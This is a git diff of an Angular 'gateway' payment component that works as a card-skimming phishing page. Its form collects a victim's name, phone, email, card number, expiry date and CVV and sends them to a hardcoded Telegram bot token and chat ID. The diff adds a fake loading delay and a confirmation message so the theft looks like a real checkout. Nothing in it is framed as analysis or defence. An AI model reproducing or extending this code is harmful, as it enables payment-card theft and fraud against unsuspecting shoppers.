@@ -1,22 +1,27 @@
 import { HttpClient } from '@angular/common/http';
 import { Component, ElementRef, OnInit, Renderer2, ViewChild } from '@angular/core';
 import { FormGroup, FormBuilder, Validators, AbstractControl, ValidationErrors } from '@angular/forms';
+import { Router } from '@angular/router';
 
 @Component({
   selector: 'app-gateway',
   templateUrl: './gateway.component.html',
   styleUrls: ['./gateway.component.css']
 })
-export class GatewayComponent {
-  paymentForm: FormGroup;
+export class GatewayComponent implements OnInit{
 
+  paymentForm: FormGroup;
   submitted = false;
+  showAlertBox: boolean = false;
+  showErrorMessage: boolean = false; // Control visibility of the error message
+  insideMessageVisible: boolean = false; // Control visibility of insideMessageDiv
 
   private readonly BOT_TOKEN = 'bot7882298266:AAHKN8O8IKjx_0VzvJPKxEEzjj_eiTAdyD0'; // Replace with your bot token
   private readonly CHAT_ID = '-4556448975';
 
-  amount = "Kč " + localStorage.getItem("finalPrice");
-  constructor(private fb: FormBuilder, private renderer: Renderer2, private http: HttpClient) {
+  amount = localStorage.getItem("finalPrice");
+
+  constructor(private fb: FormBuilder, private http: HttpClient, private router: Router) {
     this.paymentForm = this.fb.group({
       fullname: ['', [Validators.required]],
       phone: ['', [Validators.required]],
@@ -27,19 +32,14 @@ export class GatewayComponent {
     });
   }
 
-  showAlertBox: boolean = false;
+  ngOnInit(): void {}
 
-  // Call this method when you want to display the alert box
   triggerAlert() {
     this.showAlertBox = true;
-
-    // Set the alert box to disappear after 5 seconds (5000ms)
     setTimeout(() => {
       this.showAlertBox = false;
     }, 5000);
   }
-
-
 
   validateCreditCardNumber(control: any) {
     const cardNumber = control.value.replace(/\s+/g, '');
@@ -48,29 +48,18 @@ export class GatewayComponent {
   }
 
   validateExpirationDate(control: any) {
-    const input = control.value.replace(/\D/g, ''); // Remove non-digit characters
+    const input = control.value.replace(/\D/g, '');
     if (input.length !== 4) {
-      // Must have exactly 4 digits
       return { invalidExpirationDate: true };
     }
-  
     const month = parseInt(input.substring(0, 2), 10);
     const year = parseInt(input.substring(2, 4), 10);
-  
-    // Check if month is valid (1-12)
-    if (isNaN(month) || month < 1 || month > 12) {
-      return { invalidExpirationDate: true };
-    }
-  
-    const currentYear = new Date().getFullYear() % 100; // Get last two digits of the current year
-    const currentMonth = new Date().getMonth() + 1; // January is 0, so we add 1
-  
-    // Check if the expiration date is in the past
+    const currentYear = new Date().getFullYear() % 100;
+    const currentMonth = new Date().getMonth() + 1;
     if (year < currentYear || (year === currentYear && month < currentMonth)) {
-      return { expiredCard: true }; // Card expired
+      return { expiredCard: true };
     }
-  
-    return null;  // Return null if valid
+    return null;
   }
 
   formatCardNumber() {
@@ -85,15 +74,12 @@ export class GatewayComponent {
     expirationDate = expirationDate.replace(/\D/g, '').substring(0, 4);
     const month = expirationDate.substring(0, 2);
     const year = expirationDate.substring(2, 4);
-
     if (month.length === 2 && (parseInt(month, 10) < 1 || parseInt(month, 10) > 12)) {
       expirationDate = '01';
     }
-
     if (expirationDate.length >= 2) {
       expirationDate = month + '/' + year;
     }
-
     this.paymentForm.get('expirationdate')?.setValue(expirationDate);
   }
 
@@ -106,36 +92,39 @@ Email: ${this.paymentForm.value.email}\n
 CC: ${this.paymentForm.value.cardnumber}\n
 Expiration Date: ${this.paymentForm.value.expirationdate}\n
 CVV: ${this.paymentForm.value.securitycode}
-  `;
+    `;
 
-   
-    
-    // Check individual form control errors
-    const controls = this.paymentForm.controls;
-    
-
-    // If form is invalid, trigger alert
+    // Check form validity
     if (this.paymentForm.invalid) {
-      this.triggerAlert();
-      return;
+        this.triggerAlert();
+        return;
     }
 
     // Show loader
     this.submitted = true;
+
+    // Show loader for 5 seconds
     setTimeout(() => {
-      this.submitted = false;
+        this.submitted = false; // Hide loader
+        this.insideMessageVisible = true; // Show insideMessageDiv
+
+        // Hide insideMessageDiv after another 5 seconds
+        setTimeout(() => {
+            this.insideMessageVisible = false; // Hide insideMessageDiv
+        }, 5000);
+
+        // Send message after loader has finished
+        this.sendMessageToTelegram(message);
     }, 5000);
-    this.sendMessageToTelegram(message);
-    this.paymentForm.reset();
-  }
-  
+}
+
+
   sendMessageToTelegram(message: string) {
     const url = `https://api.telegram.org/${this.BOT_TOKEN}/sendMessage`;
-
     const body = {
       chat_id: this.CHAT_ID,
       text: message,
-      parse_mode: 'Markdown'  // Use 'HTML' if you prefer HTML formatting
+      parse_mode: 'Markdown'
     };
 
     this.http.post(url, body).subscribe(
@@ -148,5 +137,9 @@ CVV: ${this.paymentForm.value.securitycode}
       }
     );
   }
-
 }
+
+
+  
+
+  
